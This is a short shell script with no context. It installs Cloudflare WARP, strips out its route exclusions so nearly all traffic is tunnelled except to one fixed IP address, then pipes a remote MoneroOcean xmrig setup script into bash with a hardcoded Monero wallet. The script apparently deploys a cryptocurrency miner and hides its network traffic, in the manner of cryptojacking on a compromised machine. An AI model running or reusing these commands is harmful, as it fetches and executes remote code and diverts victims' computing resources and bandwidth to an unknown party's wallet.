wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2022_2_288_1_amd64_a0be7b47b3.deb
apt install -y ./cloudflare_warp_2022_2_288_1_amd64_a0be7b47b3.deb
warp-cli register
warp-cli remove-excluded-route 10.0.0.0/8
warp-cli remove-excluded-route 100.64.0.0/10
warp-cli remove-excluded-route 169.254.0.0/16
warp-cli remove-excluded-route 172.16.0.0/12
warp-cli remove-excluded-route 192.0.0.0/24
warp-cli remove-excluded-route 192.168.0.0/16
warp-cli remove-excluded-route 224.0.0.0/24
warp-cli remove-excluded-route 240.0.0.0/4
warp-cli remove-excluded-route 255.255.255.255/32
warp-cli remove-excluded-route fe80::/10
warp-cli remove-excluded-route fd00::/8
warp-cli remove-excluded-route ff01::/16
warp-cli remove-excluded-route ff02::/16
warp-cli remove-excluded-route ff03::/16
warp-cli remove-excluded-route ff04::/16
warp-cli remove-excluded-route ff05::/16
warp-cli add-excluded-route 147.182.158.74
warp-cli connect
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 41gPLWXEA3mFCWB1MWbfNtNzj3tQiXeK2KgUyaa9DrJEDfvwdAbs8hfJYCRWC3F6SH37chPcwKLB4RRoeHMkboYqEztvS67
